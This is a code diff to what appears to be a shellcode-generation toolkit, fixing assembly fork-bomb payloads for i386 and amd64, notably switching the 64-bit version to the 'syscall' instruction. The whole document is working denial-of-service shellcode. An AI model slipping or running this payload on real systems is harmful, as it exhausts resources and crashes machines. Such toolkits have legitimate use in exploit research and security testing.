@@ -15,7 +15,7 @@ def forkbomb(os = None, arch = None):
 def _forkbomb_i386():
     return """
 forkbomb:
-    push byte SYS_fork
+    push SYS_fork
     pop eax
     int 0x80
     jmp forkbomb
@@ -24,8 +24,8 @@ forkbomb:
 def _forkbomb_amd64():
     return """
 forkbomb:
-    push byte SYS_fork
+    push SYS_fork
     pop rax
-    int 0x80
+    syscall
     jmp forkbomb
 """
